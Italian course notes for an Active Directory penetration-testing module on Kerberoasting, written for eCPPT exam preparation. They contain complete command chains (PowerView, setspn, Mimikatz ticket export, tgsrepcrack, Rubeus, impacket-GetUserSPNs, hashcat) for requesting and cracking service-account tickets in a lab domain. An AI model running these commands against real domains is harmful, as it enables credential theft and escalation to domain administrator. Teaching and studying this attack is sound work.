# 011 — Kerberoasting (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 11/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [011_Kerberoasting.txt](011_Kerberoasting.txt) · [011_Kerberoasting.srt](011_Kerberoasting.srt)

## Concetti chiave

- **Kerberoasting** estrae l'hash della password di **account con un SPN registrato** (tipicamente service account).
- Un utente autenticato qualsiasi può chiedere un **TGS** per qualsiasi SPN; il TGS è cifrato con la **chiave dell'account proprietario dell'SPN** → crackable offline.
- Un **SPN** (Service Principal Name) è un attributo che lega un'istanza di servizio (es. `MSSQL/host.domain`) a un service account.
- Workflow del lab: **Enum SPN → Request TGS → Export tickets (Mimikatz) → Crack (`tgsrepcrack.py`)**.
- Risultato dimostrato: SPN `ops/research.security.local:1434` → service account → password crackata = `maverick`.
- È la tecnica numero 1 di privilege escalation in AD perché i service account spesso hanno password vecchie/deboli e privilegi alti.

## Spiegazione approfondita

### Cos'è un SPN
Service Principal Name = stringa univoca tipo `service_class/host:port[/service_name]` (es. `MSSQLSvc/db01.foobank.inc:1433`, `HTTP/intranet.foobank.inc`, `K_admin/ChangePassword`). Si registra su un user account (il **service account**) per permettere a un client Kerberos di richiedere un TGS per "quel servizio su quell'host".

### Perché funziona Kerberoasting
1. Qualsiasi utente autenticato nel dominio può chiedere al KDC un **TGS** per un SPN qualsiasi.
2. Il KDC lo emette cifrato con la **chiave a lungo termine dell'account proprietario dell'SPN** (NTLM hash o AES key).
3. Chi possiede il TGS può tentare **offline** una brute force / wordlist: prova password candidate, deriva la key, decifra il TGS. Se decifra correttamente → password trovata.

A differenza di AS-REP Roasting **non c'è alcuna misconfigurazione richiesta** — è una proprietà nativa di Kerberos. La debolezza è nel fatto che i service account hanno spesso password mai cambiate.

### Cosa fare con la password crackata
- Autenticarsi come **service account** → eredita i privilegi associati (spesso elevati: domain accounts, SQL admin, sysadmin).
- Spesso i service account sono in **Domain Admins** o gruppi privilegiati → privilege escalation diretta.
- Lateral movement verso i sistemi su cui gira il servizio.

### Workflow del lab (PowerShell + Mimikatz)
Alexis usa una catena "didattica" per mostrare ogni step, anche se in pratica si userebbe direttamente `Rubeus.exe kerberoast` o `impacket-GetUserSPNs`.

#### Step 1 — Identifica account con SPN (PowerView)
```powershell
Get-NetUser | Where-Object { $_.ServicePrincipalName } | Format-List
```
Output: lista user con campo `ServicePrincipalName` valorizzato (es. `K_admin/ChangePassword`, `ops/research.security.local:1434`).

#### Step 2 — Verifica con `setspn`
```cmd
setspn -T research.security.local -Q */*
```
Comando nativo Windows: lista tutti gli SPN registrati nel dominio target.

#### Step 3 — Lista i ticket Kerberos correnti
```cmd
klist
```

#### Step 4 — Richiedi un TGS per l'SPN target (.NET)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "ops/research.security.local:1434"
```
Questa è la **richiesta TGS legittima** via API .NET. Il ticket viene **cached** nella sessione corrente.

#### Step 5 — Export dei ticket con Mimikatz
```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
Salva ogni ticket cached in un file `.kirbi` nella directory corrente (es. `0-40a10000-student@ops~research.security.local~1434-RESEARCH.SECURITY.LOCAL.kirbi`).

#### Step 6 — Crack offline con `tgsrepcrack.py`
```cmd
python.exe C:\Tools\Kerberoast\python3\tgsrepcrack.py 10k-worst-passwords.txt <ticket.kirbi>
```
Output: `found password for ticket 0: maverick`.

### Versione "moderna" (non eseguita ma menzionata)
- **Rubeus**: `Rubeus.exe kerberoast /outfile:tgs.hashes` → produce hash in formato john/hashcat direttamente.
- **impacket-GetUserSPNs**: `GetUserSPNs.py research.security.local/student:<pass> -request -outputfile tgs.hashes` (da Linux).
- Crack: `hashcat -m 13100 tgs.hashes wordlist.txt` o `john --format=krb5tgs`.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `Get-NetUser \| Where-Object { $_.ServicePrincipalName } \| Format-List` | Identifica account con SPN (PowerView) | Comando esatto del video |
| `setspn -T <domain> -Q */*` | Enumera SPN nel dominio | Tool nativo Windows |
| `klist` | Lista ticket Kerberos cached | Nativo |
| `Add-Type -AssemblyName System.IdentityModel` | Carica assembly .NET per richiesta TGS | |
| `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"` | Richiede e cache un TGS per uno specifico SPN | |
| `Invoke-Mimikatz -Command '"kerberos::list /export"'` | Esporta ticket cached in file `.kirbi` | Necessario per portarli offline |
| `python tgsrepcrack.py <wordlist> <ticket.kirbi>` | Crack del TGS (Kerberoast Python suite) | Path lab: `C:\Tools\Kerberoast\python3\` |
| **Rubeus** (`kerberoast` action) | Alternativa one-shot Windows | `Rubeus.exe kerberoast /outfile:` |
| **impacket-GetUserSPNs** | Alternativa Linux | `-request -outputfile` |
| **hashcat -m 13100** / `john --format=krb5tgs` | Crack hash TGS in formato standard | |

## Esempi pratici

```powershell
# 1. Setup
powershell -ep bypass
cd C:\Tools
. .\PowerView.ps1

# 2. Enum SPN
Get-NetUser | Where-Object { $_.ServicePrincipalName } | Format-List
# es. user "Steven" con SPN K_admin/ChangePassword
# es. SPN "ops/research.security.local:1434"

# 3. Conferma con tool nativo
setspn -T research.security.local -Q */*

# 4. Carica assembly e richiedi TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "ops/research.security.local:1434"

# 5. Verifica che il TGS sia in cache
klist

# 6. Esporta con Mimikatz
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
ls *.kirbi

# 7. Crack offline
python.exe C:\Tools\Kerberoast\python3\tgsrepcrack.py `
    10k-worst-passwords.txt `
    '0-40a10000-student@ops~research.security.local~1434-RESEARCH.SECURITY.LOCAL.kirbi'
# Output: found password for ticket 0: maverick
```

```bash
# Alternativa Linux con impacket (one-shot)
impacket-GetUserSPNs research.security.local/student:Password123 \
    -request -outputfile tgs.hashes
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
```

## Punti d'attenzione per l'esame eCPPT

- **Prerequisito**: serve un **valid domain user** (qualsiasi). NON serve privilegi alti — è la potenza dell'attacco.
- **Target = account con SPN**, tipicamente service account (MSSQLSvc, HTTP, LDAP, ecc.).
- **Il TGS è cifrato con la chiave del service account** (vedi video 04). Questa è anche la chiave necessaria per il **Silver Ticket** (video 015) — collegamento importante.
- **Differenza vs AS-REP Roasting** (domanda ricorrente):
  | Aspetto | Kerberoasting | AS-REP Roasting |
  |---|---|---|
  | Target | Account con **SPN** | Account con **DONT_REQ_PREAUTH** |
  | Hash ottenuto | TGS (cifrato con key del service account) | AS-REP (cifrato con key dell'utente) |
  | Pre-requisito policy | Nessuno (nativo Kerberos) | Misconfig: preauth disabilitata |
  | Servono credenziali | Sì (un valid domain user) | No (basta username list) |
  | Hashcat mode | **13100** | **18200** |
  | John format | `krb5tgs` | `krb5asrep` |
- **`Rubeus.exe kerberoast`** è il modo standard moderno, sostituisce la catena PowerShell + Mimikatz.
- **`impacket-GetUserSPNs`** è l'equivalente cross-platform (Linux).
- **`setspn -T <domain> -Q */*`** = comando nativo Windows, "vive della terra", utile per evitare tool noti.
- Il flusso 7-step del lab è didattico ma ottimo per **memorizzare la teoria** dietro il tool one-shot.
- Service account con privilegi DA = **straight win**: crack → login → Domain Admin.
- **OPSEC**: ogni TGS richiesto genera un evento 4769 sul DC; richiedere TGS in massa è rumoroso → preferire target enumerati.

## Collegamenti con altri video

- Precedente: [[010_AS-REP Roasting]] — il complementare.
- Prossimo: [[012_AD Lateral Movement_ Pass-the-Hash]]
- Enumeration utenti con SPN: [[09_AD Enumeration_ PowerView]]
- Identificazione grafica target: [[08_AD Enumeration_ BloodHound]] (query *List all Kerberoastable Accounts*).
- Teoria del TGS e key del service account: [[04_Active Directory Authentication]]
- Lo stesso hash usato per forgia ticket: [[015_AD Persistence_ Silver Ticket]]
